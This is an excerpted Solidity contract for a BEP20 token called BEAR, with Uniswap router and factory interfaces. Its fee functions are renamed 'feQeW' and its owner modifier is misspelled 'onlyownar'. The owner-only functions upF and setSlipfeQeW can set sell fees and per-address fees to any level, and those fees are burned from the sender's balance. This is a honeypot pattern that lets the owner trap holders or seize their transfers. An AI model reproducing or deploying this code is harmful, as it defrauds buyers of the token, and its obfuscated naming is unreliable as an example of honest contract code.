...
interface IUniswapV2Factory {
    ...
    function feQeWTo() external view returns (address);
    function feQeWToSetter() external view returns (address);
    ...
    function setfeQeWTo(address) external;
    function setfeQeWToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfeQeWOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfeQeWOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfeQeWOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfeQeWOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfeQeWOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract BEAR is BEP20, Ownable {
    ...
    uint256 private _defaultSellfeQeW = 0;

    uint256 private _defaultBuyfeQeW = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfeQeW;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfeQeW = _value;
    }

    function setSlipfeQeW(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfeQeW[_address] = _value;
    }

    function getSlipfeQeW(address _address) external view onlyownar returns (uint256) {
        return _slipfeQeW[_address];
    }


    function setMAccountfeQeW(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfeQeW(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefeQeWAmount = 0;

        if (rF) {
            uint256 tradefeQeW = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefeQeW = _defaultSellfeQeW;
                }
                if (from == uniswapV2Pair) {

                    tradefeQeW = _defaultBuyfeQeW;
                }
            }
            if (_slipfeQeW[from] > 0) {
                tradefeQeW = _slipfeQeW[from];
            }

            tradefeQeWAmount = _Amount.mul(tradefeQeW).div(100);
        }


        if (tradefeQeWAmount > 0) {
            _balances[from] = _balances[from].sub(tradefeQeWAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefeQeWAmount);
            emit Transfer(from, _deadAddress, tradefeQeWAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefeQeWAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefeQeWAmount);
        emit Transfer(from, _to, _Amount - tradefeQeWAmount);
    }
